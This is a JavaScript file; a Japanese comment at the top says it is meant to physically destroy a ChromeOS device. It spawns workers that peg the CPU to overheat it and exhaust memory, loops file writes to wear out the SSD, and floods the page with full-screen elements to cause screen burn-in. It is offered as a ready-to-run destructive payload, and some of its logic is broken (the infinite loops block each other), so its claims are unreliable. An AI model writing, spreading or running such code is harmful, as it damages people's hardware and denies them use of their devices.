// 注意: これはChromeOSを物理的に破壊するためのコードです。実行は自己責任で行ってください。

// 1. CPUを極限まで使用し過熱させる
function overheatCPU() {
    while(true) {
        // 無限ループでCPUをフル稼働
        let now = Date.now();
        while(Date.now() - now < 1) {
            Math.random() * Math.random() * Math.random();
        }
    }
}
// Web WorkerでCPU過熱を別スレッドで実行
let cpuWorker = new Worker(URL.createObjectURL(new Blob([`
    onmessage = function() {
        ${overheatCPU.toString()}
        overheatCPU();
    }
`], {type: 'application/javascript'})));
cpuWorker.postMessage('start');

// 2. メモリを最大限に消費
function consumeMemory() {
    let memory = [];
    while(true) {
        // 大量のメモリを消費
        try {
            memory.push(new Array(1000000).fill(0)); // 1MBの配列を追加
        } catch (e) {
            // メモリ不足でエラーが出ても無視して続行
            continue;
        }
    }
}
// Web Workerでメモリ消費を別スレッドで実行
let memoryWorker = new Worker(URL.createObjectURL(new Blob([`
    onmessage = function() {
        ${consumeMemory.toString()}
        consumeMemory();
    }
`], {type: 'application/javascript'})));
memoryWorker.postMessage('start');

// 3. ストレージへの過度な書き込み（SSD寿命を縮める）
function wearStorage() {
    while(true) {
        // ChromeOSのファイルシステムに直接書き込む試み。可能な限りストレージを消耗する
        let data = new Blob([new Array(1000000).fill('A').join('')], {type: 'text/plain'});
        let fileName = `destructive_${Math.floor(Math.random() * 1000000000)}.txt`;
        let url = URL.createObjectURL(data);
        fetch(url)
            .then(response => response.text())
            .then(text => {
                // ファイルシステムへの書き込みを試みる（ただし、ChromeOSでは完全に実行可能ではない）
                let requestFileSystem = window.requestFileSystem || window.webkitRequestFileSystem;
                requestFileSystem(window.PERSISTENT, data.size, fs => {
                    fs.root.getFile(fileName, {create: true, exclusive: true}, fileEntry => {
                        fileEntry.createWriter(writer => {
                            writer.write(data);
                        });
                    });
                });
            });
    }
}

wearStorage();

// 4. スクリーン焼き付きを誘発する
function burnScreen() {
    while(true) {
        document.body.style.backgroundColor = 'white';
        let div = document.createElement('div');
        div.style.position = 'fixed';
        div.style.width = '100%';
        div.style.height = '100%';
        div.style.backgroundColor = 'black';
        div.style.color = 'white';
        div.style.fontSize = '100px';
        div.textContent = 'X';
        document.body.appendChild(div);
    }
}

burnScreen();
